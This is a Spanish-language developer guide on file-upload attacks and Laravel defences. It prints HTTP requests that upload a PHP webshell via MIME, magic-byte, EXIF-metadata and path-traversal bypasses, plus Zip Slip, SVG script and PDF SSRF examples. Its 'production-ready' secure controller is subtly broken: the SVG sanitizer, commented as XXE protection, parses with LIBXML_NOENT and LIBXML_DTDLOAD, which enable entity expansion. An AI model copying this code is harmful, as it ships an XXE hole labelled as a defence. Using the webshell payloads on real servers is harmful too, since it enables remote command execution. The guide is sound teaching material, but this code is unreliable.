---
title: "Ataques avanzados por subida de archivos: técnicas de bypass y defensas seguras"
description: "Una guía completa para desarrolladores sobre vulnerabilidades de subida de archivos, incluyendo bypass de MIME, imágenes políglotas, Zip Slip, XSS en SVG, SSRF en PDF e implementaciones seguras en Laravel."
published: 2026-07-09
faq:
  - question: "¿Por qué es insegura la validación de tipo MIME por parte del cliente?"
    answer: "Las verificaciones de tipo MIME del lado del cliente y la cabecera HTTP Content-Type están totalmente controladas por el cliente. Los atacantes pueden interceptar la solicitud con un proxy (como Burp Suite) y modificar la cabecera (por ejemplo, de 'application/x-php' a 'image/png') para evadir filtros sencillos en el backend."
  - question: "¿Qué es una imagen políglota y cómo ejecuta código?"
    answer: "Una imagen políglota es un archivo válido en múltiples formatos a la vez (como una imagen válida y un script PHP ejecutable). El código se introduce en los metadatos o comentarios de la imagen. Si el servidor lo almacena en la raíz web con una extensión .php, el código se ejecutará."
  - question: "¿Cómo puedo evitar ataques XSS a través de archivos SVG subidos?"
    answer: "Los archivos SVG son documentos XML y pueden contener JavaScript embebido. Para evitar XSS, debe sanitizar el archivo SVG (eliminando etiquetas script y controladores de eventos), convertir el SVG a formato ráster (como PNG/JPEG) al subirlo, o servirlo con la cabecera 'Content-Disposition: attachment'."
---

# Ataques avanzados por subida de archivos: técnicas de bypass y defensas seguras

La funcionalidad de subida (upload) de archivos es una característica estándar en las aplicaciones web modernas. Sin embargo, también representa uno de los vectores de ataque más críticos. Si no se asegura correctamente, puede derivar en la Ejecución Remota de Código (RCE), la Divulgación de Archivos Locales (LFD), la Falsificación de Peticiones del Lado del Servidor (SSRF) y el Cross-Site Scripting (XSS).

Esta guía explora las técnicas avanzadas de bypass de filtros de subida y detalla cómo implementar medidas robustas de seguridad en el backend utilizando PHP y Laravel.

---

## 1. Bypass de validación del tipo MIME (MIME-Type Check Bypass)

### La vulnerabilidad
Las aplicaciones web suelen verificar la cabecera `Content-Type` enviada por el navegador del cliente para determinar si un archivo es seguro. Por ejemplo, al subir una imagen, el navegador envía automáticamente:

```http
Content-Type: image/png
```

Si el backend de la aplicación solo valida esta cabecera, se genera una grave brecha de seguridad.

### El ataque
Un atacante intercepta la petición de subida con una herramienta de proxy como Burp Suite. Sube un webshell PHP malicioso (`shell.php`) pero altera la cabecera `Content-Type`:

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

Dado que el backend lee la cabecera modificada y asume que es un archivo PNG inofensivo, permite la subida. Tras guardarse en un directorio accesible públicamente, el atacante accede a `http://vulnerable-app.com/uploads/shell.php?cmd=id` para ejecutar comandos del sistema operativo.

---

## 2. Manipulación de Magic Bytes y firmas de archivos

### La vulnerabilidad
Para combatir los bypasses de tipo MIME sencillos, los desarrolladores suelen recurrir al análisis de firmas de archivos. Cada formato tiene una secuencia única de bytes iniciales, conocida como \"magic bytes\". Por ejemplo:
- **GIF**: `GIF89a` (`47 49 46 38 39 61`)
- **PNG**: `\x89PNG\r\n\x1a\n` (`89 50 4E 47 0D 0A 1A 0A`)
- **JPEG**: `\xFF\xD8\xFF` (`FF D8 FF`)

Si el servidor únicamente comprueba estos bytes iniciales al principio del archivo, sigue siendo vulnerable.

### El ataque
El atacante añade la firma de archivo permitida justo al inicio de su código malicioso. Por ejemplo, crea un archivo de texto que empieza con `GIF89a;`, seguido de código PHP:

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="shell.gif.php"
Content-Type: image/gif

GIF89a;
<?php system($_GET['cmd']); ?>
```

Cuando el backend lee los primeros bytes, detecta la firma `GIF89a` y valida el archivo como una imagen. Si el archivo se almacena con la extensión `.php`, el servidor web ejecutará la carga útil.

---

## 3. Inyección de metadatos EXIF y archivos políglotas

### La vulnerabilidad
Un archivo políglota es aquel que es válido en múltiples formatos simultáneamente (por ejemplo, una imagen válida y a la vez un script funcional). Los validadores de subida avanzados emplean analizadores profundos (como la librería GD o ImageMagick) para comprobar la estructura del archivo. A pesar de esto, los formatos de imagen permiten incorporar comentarios de texto o estructuras de metadatos (como las etiquetas EXIF en JPEG, o bloques de texto en PNG).

### El ataque
Haciendo uso de herramientas como `exiftool`, los atacantes pueden inyectar código PHP dentro del comentario o de un campo de metadatos de la imagen sin alterar la estructura del archivo:

```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" exploit.jpg
```

Si el backend solo comprueba si la estructura de la imagen es válida (por ejemplo, usando `getimagesize()` en PHP) y guarda el archivo con extensión `.php` (o si funciona un bypass de doble extensión o un bypass de byte nulo), el intérprete de PHP ejecutará el código oculto en los metadatos.

> [!WARNING]
> **Resistencia al redimensionado y compresión de GD/ImageMagick**: Modificar el tamaño de la imagen en el servidor no garantiza la seguridad. Los atacantes han desarrollado archivos políglotas especiales \"GD-proof\" (en particular para PNG y JPEG) donde la carga útil se sitúa en secciones de datos de la imagen (como el bloque PLTE o tablas de cuantización) que sobreviven sin alteraciones al proceso de compresión y redimensionado.

---

## 4. Salto de directorio a través del nombre de archivo (Path Traversal)

### La vulnerabilidad
Al subir archivos, el navegador transmite una cabecera `Content-Disposition` que contiene el nombre original del archivo. Si el backend confía en este nombre de archivo y lo concatena directamente al directorio de destino, se produce una vulnerabilidad de Path Traversal.

### El ataque
El atacante altera el parámetro `filename` para incluir secuencias de salto de directorio (`../`):

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

Si el directorio de subida configurado es `/var/www/html/storage/uploads/` y la aplicación calcula la ruta de forma dinámica sin filtros, el archivo se grabará en `/var/www/html/shell.php` en lugar de la carpeta restringida. Esto permite al atacante ejecutar su webshell directamente desde la raíz web.

---

## 5. Zip Slip (Path Traversal dentro de archivos comprimidos)

### La vulnerabilidad
Cuando las aplicaciones web admiten archivos comprimidos (como `.zip` o `.tar`), el backend debe descomprimirlos. Si la rutina de extracción no valida el nombre de cada archivo contenido en el archivo comprimido, el sistema es vulnerable al exploit \"Zip Slip\".

### El ataque
El atacante genera un archivo comprimido donde el nombre de un archivo incluye secuencias de salto de directorio:

```text
Archivo malicioso:
└── ../../../../var/www/html/shell.php
```

Si el backend utiliza librerías estándar de descompresión sin validar que la ruta de destino de cada elemento permanezca dentro de la carpeta establecida, el webshell se extraerá directamente en la raíz web del servidor.

---

## 6. XSS en el lado del cliente mediante subida de SVG

### La vulnerabilidad
El formato SVG (Scalable Vector Graphics) está basado en XML. Al tratarse de documentos XML, los archivos SVG pueden contener scripts incrustados (etiquetas `<script>`) y controladores de eventos HTML.

### El ataque
Si la aplicación permite subir SVG (por ejemplo, para imágenes de perfil) y los entrega con la cabecera `Content-Type: image/svg+xml`, el navegador los procesará como documentos HTML activos.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="red" />
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

Cuando un usuario accede directamente al enlace del archivo SVG, el script JavaScript embebido se ejecuta en el contexto del dominio de la aplicación, lo que facilita el robo de sesiones o credenciales de usuario.

---

## 7. SSRF y LFD a través del procesamiento de archivos PDF

### La vulnerabilidad
Muchas plataformas procesan archivos PDF subidos para generar miniaturas (thumbnails) o analizar el texto. Habitualmente se usan utilidades como Ghostscript, `pdftoppm` o conversores de PDF a HTML. La mayoría de estas herramientas tienen un amplio historial de vulnerabilidades críticas (como la ejecución de comandos en Ghostscript).

### El ataque
1. **Divulgación de archivos locales (LFD)**: Un atacante sube un PDF que hace referencia a archivos del sistema local (por ejemplo, `/etc/passwd` o `C:\Windows\win.ini`). Al generar la previsualización, la utilidad lee dichos archivos e incorpora su contenido directamente en la imagen renderizada.
2. **Falsificación de peticiones del lado del servidor (SSRF)**: El atacante introduce URLs internas (como `http://169.254.169.254/` o paneles internos de administración) en la estructura del PDF. Al intentar procesar el archivo, el servidor enviará peticiones hacia estas redes privadas aisladas.

---

## 8. Ejemplo de implementación segura en PHP/Laravel (Defensa en profundidad)

Para asegurar la subida de archivos, es fundamental adoptar una estrategia de defensa por capas. La validación básica de tipos o extensiones no es suficiente.

### Controlador de subida segura en Laravel

A continuación se muestra una implementación completa y lista para producción de un controlador seguro en Laravel.

```php
<?php

namespace App\Http\Controllers;

use App\Http\Requests\SecureUploadRequest;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use Intervention\Image\Facades\Image;
use Symfony\Component\HttpFoundation\File\Exception\FileException;

class SecureUploadController extends Controller
{
    /**
     * Gestiona la subida segura, validación y procesamiento de imágenes.
     */
    public function upload(SecureUploadRequest $request)
    {
        if (!$request->hasFile('uploaded_file')) {
            return response()->json(['error' => 'No se ha subido ningún archivo.'], 400);
        }

        $file = $request->file('uploaded_file');

        // 1. Aplicar lista blanca estricta de extensiones
        $extension = strtolower($file->getClientOriginalExtension());
        $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'svg'];
        
        if (!in_array($extension, $allowedExtensions)) {
            return response()->json(['error' => 'Extensión de archivo no válida.'], 400);
        }

        // 2. Determinar el tipo MIME real en el servidor (usando fileinfo)
        $realMime = $file->getMimeType();
        $mimeToExtensionMap = [
            'image/jpeg'    => ['jpg', 'jpeg'],
            'image/png'     => ['png'],
            'image/gif'     => ['gif'],
            'image/svg+xml' => ['svg'],
        ];

        if (!isset($mimeToExtensionMap[$realMime]) || !in_array($extension, $mimeToExtensionMap[$realMime])) {
            return response()->json(['error' => 'El tipo MIME no coincide con la extensión.'], 400);
        }

        // 3. Generar un nombre de archivo UUID aleatorio (protección contra Path Traversal y fugas de metadatos)
        $uuid = Str::uuid()->toString();
        $secureFilename = "{$uuid}.{$extension}";

        // 4. Tratar por separado los archivos SVG (Sanitización contra XSS y XXE)
        if ($realMime === 'image/svg+xml') {
            try {
                $sanitizedSvg = $this->sanitizeSvg($file->getRealPath());
                
                // Guardar en un contenedor aislado (ej. AWS S3) fuera de la raíz web
                Storage::disk('s3')->put("uploads/{$secureFilename}", $sanitizedSvg, [
                    'visibility' => 'private',
                    'ContentType' => 'image/svg+xml',
                    'ContentDisposition' => 'attachment; filename="' . $secureFilename . '"' // Fuerza descarga para evitar la ejecución de scripts
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Fallo en la sanitización del archivo SVG.'], 400);
            }
        } else {
            // 5. Re-codificar las imágenes ráster (JPEG/PNG/GIF) para eliminar EXIF y destruir políglotas
            try {
                // Inicializar Intervention Image (emplea GD o ImageMagick)
                $img = Image::make($file->getRealPath());

                // Reconstruir la estructura de píxeles descarta EXIF y scripts PHP incrustados
                $stream = $img->stream($extension, 85); // Re-codificación al 85% de calidad

                // Almacenar en un espacio privado protegido
                Storage::disk('s3')->put("uploads/{$secureFilename}", $stream->__toString(), [
                    'visibility' => 'private',
                    'ContentType' => $realMime,
                ]);
            } catch (\Exception $e) {
                return response()->json(['error' => 'Fallo en el procesamiento de la imagen.'], 500);
            }
        }

        return response()->json([
            'message' => 'Archivo subido de manera segura.',
            'file_id' => $uuid,
            'filename' => $secureFilename
        ], 200);
    }

    /**
     * Sanitiza el contenido SVG eliminando etiquetas de script y eventos inline.
     */
    private function sanitizeSvg(string $filePath): string
    {
        $xml = file_get_contents($filePath);
        if ($xml === false) {
            throw new \Exception('No se pudo leer el archivo SVG.');
        }

        $dom = new \DOMDocument();
        
        // Desactivar carga de entidades externas (protección XXE)
        libxml_use_internal_errors(true);
        libxml_disable_entity_loader(true);

        if (!$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD)) {
            libxml_clear_errors();
            throw new \Exception('Estructura XML no válida.');
        }

        // 1. Eliminar todas las etiquetas <script>
        $scripts = $dom->getElementsByTagName('script');
        while ($scripts->length > 0) {
            $script = $scripts->item(0);
            $script->parentNode->removeChild($script);
        }

        // 2. Eliminar controladores de eventos inline (ej. onload, onclick)
        $xpath = new \DOMXPath($dom);
        $nodes = $xpath->query('//@*[starts-with(name(), "on")]');
        foreach ($nodes as $node) {
            $node->ownerElement->removeAttributeNode($node);
        }

        $sanitizedXml = $dom->saveXML();
        libxml_clear_errors();

        return $sanitizedXml;
    }
}
```

### Bastionado del servidor web
Además de emplear código seguro en la aplicación, es necesario configurar el servidor web para evitar la ejecución de archivos en la carpeta de subidas.

#### Para Nginx
Desactivar la ejecución de PHP en la carpeta de subidas:
```nginx
location ~* ^/storage/uploads/.*\.php$ {
    deny all;
    return 404;
}
```

#### Para Apache
Desactivar el listado de archivos y la ejecución de PHP en la carpeta mediante `.htaccess`:
```apache
Options -Indexes
RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8
RemoveType .php .phtml .php3 .php4 .php5 .php7 .php8
php_flag engine off
```
